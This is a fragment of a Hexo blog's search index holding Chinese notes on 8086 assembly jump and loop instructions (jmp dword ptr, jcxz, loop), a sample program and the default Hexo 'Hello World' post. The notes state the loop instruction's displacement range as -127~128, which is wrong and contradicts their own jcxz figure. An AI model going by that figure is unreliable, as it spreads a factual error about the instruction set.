：将寄存器cs，ip中的数据改为对应内存单元中的字数据，cs改为高位的字数据，ip改为低位的字数据<br>如：<br>Mov ax，0123h<br>Mov ds:[0]，ax<br>Mov word ptr ds：[2]，0<br>Jmp dword ptr ds:[0]<br>//执行后从ds：[0]开始的两个字数据，cs取其中的高位，ip取其中的低位<br>执行后：（cs）=0000h      （ip）=0123h</p><pre><code>    Jcxz指令</code></pre><p>Jcxz指令是有条件转移指令，所有的有条件转移指令都是短转移，在段内根据位移进行跳转，ip范围是：-128~127</p><p>格式：jcxz 标号  ——执行这个指令前判断：如果寄存器cx=o则进行跳转否则向下走<br>很想这个：if（cx==0）jmp short 标号<br>例如：利用jcxz指令,现实在内存2000H段中查找第一个值为0的字节,找到后,将它的偏移地址存储在dx中.<br>assume cs:codesg<br>codesg segment<br>start:    mov ax,2000H<br>        mov ds,ax<br>        mov bx,0<br>    s:    mov cl,[bx]<br>        mov ch,0<br>        jcxz ok<br>        inc bx<br>        jmp short s</p><pre><code>ok:    mov dx,bx    mov ax,4c00h    int 21h</code></pre><p>codesg ends<br>end start </p><pre><code>          loop指令</code></pre><p>Loop指令是循环指令，所有的循环指令都是短转移，也是根据位移进行转移，ip修改范围是-127~128<br>格式：loop 标号——执行时进行两步操作<br>1：（cx）=（cx）-1<br>2：判断cx，若cx为0不转跳，向下走，若cx不为0转跳<br>相当于：<br>（cx）–；<br>If（cx！=0）jmp short 标号；——从这里可以看出loop指令与有条件转移指令很类似</p><p>Dec功能与inc相反<br>Dec bx ——（bx）=（bx）-1</p>]]></content>
      
      
      
        <tags>
            
            <tag> 这仅仅是个开始 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/11/29/hello-world/"/>
      <url>/2019/11/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><pre class=" language-bash"><code class="language-bash">$ hexo 有点骚</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
